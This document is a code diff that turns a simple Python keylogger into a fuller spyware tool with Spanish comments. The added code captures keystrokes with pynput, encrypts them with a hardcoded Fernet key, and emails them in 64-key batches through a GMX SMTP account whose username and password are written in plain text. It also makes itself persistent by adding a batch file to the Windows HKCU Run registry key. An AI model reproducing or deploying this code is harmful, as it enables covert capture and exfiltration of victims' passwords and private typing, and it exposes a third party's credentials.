@@ -1,67 +1,107 @@
-import os
 from pynput.keyboard import Listener
 from cryptography.fernet import Fernet
-import smtplib
+from smtplib import SMTP_SSL as SMTP
+from email.mime.text import MIMEText
+from os import path, environ
+from sys import argv
+from winreg import HKEY_CURRENT_USER,OpenKey,\
+QueryValueEx,SetValueEx,CloseKey,KEY_ALL_ACCESS,REG_SZ
 
-keys = []
-count = 0
-path = os.environ['appdata'] +'\\processmanager.txt'
-#path = 'processmanager.txt'
+
+destination = ['awdwada@gmx.es']
+USERNAME = "awdwada@gmx.es"
+PASSWORD = "Hg*VWa,N~@0'"
+clave = b'W3NFJwDhdDLeE48araLk2P_kETmFjPhct-kif7QhgI4='
+
+keys,count = [],0
+path = environ['appdata'] +'\\processmanager.txt'
+
 
 def cifrar(texto, clave): return Fernet(clave).encrypt(texto)
 
-
-def enviar_correo(sender, recipien, message):
-    sender_email, sender_password = sender
-    # Configuración del servidor SMTP de Gmail
-    smtp_server = 'smtp.gmail.com'
-    smtp_port = 587  # Puerto de Gmail para TLS
-    # Crear conexión segura con el servidor SMTP de Gmail
-    server = smtplib.SMTP(smtp_server, smtp_port)
-    server.starttls()
-    # Iniciar sesión en tu cuenta de Gmail
-    server.login(sender_email, sender_password)
-    # Enviar correo electrónico
-    server.sendmail(sender_email, recipient, message)
-    # Cerrar conexión con el servidor SMTP
-    server.quit()
+def sendmsg(USERNAME,PASSWORD,destination,content):
+    try:
+        # Creamos un objeto MIME para el correo
+        msg = MIMEText(content, 'plain')
+        # Definimos el campo del sujeto
+        msg['Subject']="Keylogger"
+        # Definimos el campo que dice quien lo envia
+        msg['From'] = USERNAME
+        # Creamos una conexion con el servidor SMTP
+        conn = SMTP('mail.gmx.com')
+        # Lo configuramos sin modo verbose
+        conn.set_debuglevel(False)
+        # Iniciamos sesion en el servidor
+        conn.login(USERNAME, PASSWORD)
+        # Enviamos el mensaje
+        try: conn.sendmail(USERNAME, destination, msg.as_string())
+        finally: conn.quit()
+    except: pass
 
 
 def on_press(key):
     global keys, count
     keys.append(key)
     count += 1
-    if count >= 1:
+    if count >= 64:
         count = 0
         write_file(keys)
         keys = []
 
 def write_file(keys):
     global sender, recipient, clave
-    with open(path, 'a') as f:
-        for key in keys:
-            k = str(key).replace("'", "")
-            if k.find('backspace') > 0:
-                f.write(' Backspace ')
-            elif k.find('enter') > 0:
-                f.write('\n')
-            elif k.find('shift') > 0:
-                f.write(' Shift ')
-            elif k.find('space') > 0:
-                f.write(' ')
-            elif k.find('caps_lock') > 0:
-                f.write(' caps_lock ')
-            elif k.find('Key'):
-                f.write(k)
+    data = []
+    for key in keys:
+        k = str(key).replace("'", "")
+        if k.find('backspace') > 0:
+            data.append(' Backspace ')
+        elif k.find('enter') > 0:
+            data.append('\n')
+        elif k.find('shift') > 0:
+            data.append(' Shift ')
+        elif k.find('space') > 0:
+            data.append(' ')
+        elif k.find('caps_lock') > 0:
+            data.append(' caps_lock ')
+        elif k.find('Key'):
+            data.append(k)
 
     # Mandamos correo
-    data = "\n".join(open(path,"r").readlines())
-    enviar_correo(sender, recipient, cifrar(data.encode('utf-8'), clave))
+    data = "".join(data).encode("UTF-8")
+    data = cifrar(data, clave).decode("UTF-8")
+    sendmsg(USERNAME,PASSWORD,destination,data)
+
+
+def add_to_startup():
+    script_path = path.realpath(argv[0])
+    bat_path = path.splitext(script_path)[0] + '.bat'
+
+    # Create the batch file to run the script
+    with open(bat_path, 'w') as bat_file:
+        bat_file.write(f'@echo off\npythonw "{script_path}"')
+
+    key = HKEY_CURRENT_USER
+    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+    entry_name = "MyPythonScript"
+
+    try:
+        open_key = OpenKey(key, key_value, 0, KEY_ALL_ACCESS)
+        try:
+            value, _ = QueryValueEx(open_key, entry_name)
+            if value == bat_path:
+                print("Entry already exists in the registry.")
+            else:
+                print("Updating the existing entry in the registry.")
+                SetValueEx(open_key, entry_name, 0, REG_SZ, bat_path)
+        except FileNotFoundError:
+            print("Adding new entry to the registry.")
+            SetValueEx(open_key, entry_name, 0, REG_SZ, bat_path)
+        CloseKey(open_key)
+    except Exception as e:
+        print(f"Failed to add to startup: {e}")
 
 
 if __name__=="__main__":
-    sender = ['correo que lo envia', 'su contraseña']
-    recipient = 'correo a donde se va a enviar'
-    clave = b'W3NFJwDhdDLeE48araLk2P_kETmFjPhct-kif7QhgI4='
+    add_to_startup()
     with Listener(on_press=on_press) as listener:
         listener.join()
